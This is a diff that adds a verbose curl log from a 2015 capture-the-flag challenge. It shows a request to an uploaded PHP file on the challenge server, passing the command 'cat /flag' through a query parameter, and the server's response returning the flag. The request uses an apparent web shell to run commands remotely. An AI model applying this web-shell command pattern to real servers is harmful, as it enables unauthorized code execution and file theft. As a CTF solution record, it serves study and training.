@@ -1,0 +1,18 @@
+curl -v -G 'http://recocta.chal.mmactf.link:9080/u/605c8dab092dc5b9114f4d30c4b16fad.php' --data-urlencode 'c=cat /flag'
+*   Trying 104.214.137.224...
+* Connected to recocta.chal.mmactf.link (104.214.137.224) port 9080 (#0)
+> GET /u/605c8dab092dc5b9114f4d30c4b16fad.php?c=cat%20%2Fflag HTTP/1.1
+> Host: recocta.chal.mmactf.link:9080
+> User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Sun, 06 Sep 2015 02:31:54 GMT
+< Server: Apache/2.4.7 (Ubuntu)
+< X-Powered-By: PHP/5.5.9-1ubuntu4.11
+< Content-Length: 37
+< Content-Type: text/html
+<
+MMA{you can run php from script tag}
+* Connection #0 to host recocta.chal.mmactf.link left intact
+
